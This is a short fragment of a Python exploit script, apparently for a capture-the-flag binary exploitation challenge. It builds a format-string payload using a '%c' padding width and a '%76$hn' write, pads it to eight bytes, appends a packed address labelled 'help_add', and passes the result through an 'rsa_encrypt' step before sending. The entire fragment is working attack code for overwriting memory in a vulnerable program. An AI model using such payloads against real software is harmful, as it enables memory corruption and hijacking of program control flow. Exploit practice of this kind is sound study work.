# 2. rsa_encrypt
pay = "%{}c".format(0x7c0)
pay += "%{}$hn".format(76) # base offset 76. 76 + len(pay) / 8
pay += "A"*(8-len(pay) % 8)
print(len(pay))
plain = pay.encode() + p64(help_add)
enc = rsa_encrypt(plain)